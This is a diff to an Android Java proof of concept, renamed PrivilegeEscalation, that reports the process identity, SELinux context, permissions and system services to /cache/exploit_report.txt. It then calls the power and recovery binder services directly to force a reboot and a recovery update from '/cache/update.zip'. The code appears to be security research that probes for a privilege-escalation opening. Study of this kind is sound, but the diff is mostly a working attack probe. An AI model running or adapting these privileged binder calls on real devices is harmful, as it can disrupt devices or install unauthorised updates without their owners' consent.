@@ -1,3 +1,4 @@
+// PrivilegeEscalation.java
 package com.poc;
 
 import android.content.pm.IPackageManager;
@@ -21,7 +22,7 @@ import java.text.SimpleDateFormat;
 import java.util.Date;
 import java.util.Locale;
 
-public class Main {
+public class PrivilegeEscalation {
 
     private static final String REPORT_PATH = "/cache/exploit_report.txt";
 
@@ -35,6 +36,7 @@ public class Main {
         report.append("========================================\n\n");
 
         try {
+            // --- [1] 基本プロセス情報 ---
             report.append("--- [1] Basic Process Identity ---\n");
             int uid = Process.myUid();
             int gid = Process.myGid();
@@ -43,12 +45,13 @@ public class Main {
             report.append("GID: ").append(gid).append("\n");
             report.append("PID: ").append(pid).append("\n");
 
-            IPackageManager pm = IPackageManager.Stub.asInterface(ServiceManager.getService("package"));
+            // IPackageManager を取得（ServiceManager 経由）
+            IPackageManager pm = getPackageManager();
             if (pm != null) {
                 String[] pkgs = pm.getPackagesForUid(uid);
                 report.append("Related Packages: ").append(pkgs != null ? String.join(", ", pkgs) : "None").append("\n\n");
             } else {
-                report.append("Related Packages: Service not available\n\n");
+                report.append("Related Packages: ServiceManager not available\n\n");
             }
 
             // --- [2] SELinux コンテキスト ---
@@ -74,7 +77,7 @@ public class Main {
             report.append("Execute test (/system/bin/sh): ").append(canExecute("/system/bin/sh")).append("\n");
             report.append("Execute test (/data/local/tmp): ").append(canExecute("/data/local/tmp/dummy")).append("\n\n");
 
-            // --- [6] Android パーミッション ---
+            // --- [6] Android パーミッション（AIDL 経由） ---
             report.append("--- [6] Android Runtime Permissions (AIDL) ---\n");
             if (pm != null) {
                 String[] perms = {
@@ -98,8 +101,8 @@ public class Main {
             }
             report.append("\n");
 
-            // --- [7] システムサービスの存在確認 ---
-            report.append("--- [7] System Services (AIDL) ---\n");
+            // --- [7] システムサービスの存在確認（ServiceManager 経由） ---
+            report.append("--- [7] System Services (Binder) ---\n");
             report.append("package: ").append(serviceStatus("package")).append("\n");
             report.append("power: ").append(serviceStatus("power")).append("\n");
             report.append("recovery: ").append(serviceStatus("recovery")).append("\n");
@@ -142,7 +145,7 @@ public class Main {
 
             // IPowerManager.reboot
             report.append("[IPowerManager.reboot]: ");
-            IPowerManager pow = IPowerManager.Stub.asInterface(ServiceManager.getService("power"));
+            IPowerManager pow = getPowerManager();
             if (pow != null) {
                 try { pow.reboot(false, "", false); report.append("SUCCESS (device rebooting)\n"); }
                 catch (RemoteException e) { report.append("FAILED (RemoteException)\n"); }
@@ -150,7 +153,7 @@ public class Main {
 
             // IRecoverySystem.rebootRecoveryWithCommand
             report.append("[IRecoverySystem.rebootRecoveryWithCommand]: ");
-            IRecoverySystem rs = IRecoverySystem.Stub.asInterface(ServiceManager.getService("recovery"));
+            IRecoverySystem rs = getRecoverySystem();
             if (rs != null) {
                 try { rs.rebootRecoveryWithCommand("--update_package=/cache/update.zip"); report.append("SUCCESS\n"); }
                 catch (RemoteException e) { report.append("FAILED (RemoteException)\n"); }
@@ -219,10 +222,43 @@ public class Main {
         else { File p = f.getParentFile(); return p != null && p.exists() ? "FILE NOT FOUND, parent exec: " + (p.canExecute() ? "YES" : "NO") : "PATH NOT FOUND"; }
     }
 
+    // ----- ServiceManager ラッパー（リフレクションでも可） -----
+    private static IPackageManager getPackageManager() {
+        try {
+            IBinder binder = ServiceManager.getService("package");
+            if (binder == null) return null;
+            return IPackageManager.Stub.asInterface(binder);
+        } catch (Exception e) {
+            return null;
+        }
+    }
+
+    private static IPowerManager getPowerManager() {
+        try {
+            IBinder binder = ServiceManager.getService("power");
+            if (binder == null) return null;
+            return IPowerManager.Stub.asInterface(binder);
+        } catch (Exception e) {
+            return null;
+        }
+    }
+
+    private static IRecoverySystem getRecoverySystem() {
+        try {
+            IBinder binder = ServiceManager.getService("recovery");
+            if (binder == null) return null;
+            return IRecoverySystem.Stub.asInterface(binder);
+        } catch (Exception e) {
+            return null;
+        }
+    }
+
     private static String serviceStatus(String name) {
         try {
             IBinder binder = ServiceManager.getService(name);
             return (binder != null && binder.isBinderAlive()) ? "ALIVE" : "NULL or DEAD";
-        } catch (Exception e) { return "Error: " + e.getMessage(); }
+        } catch (Exception e) {
+            return "Error: " + e.getMessage();
+        }
     }
 }
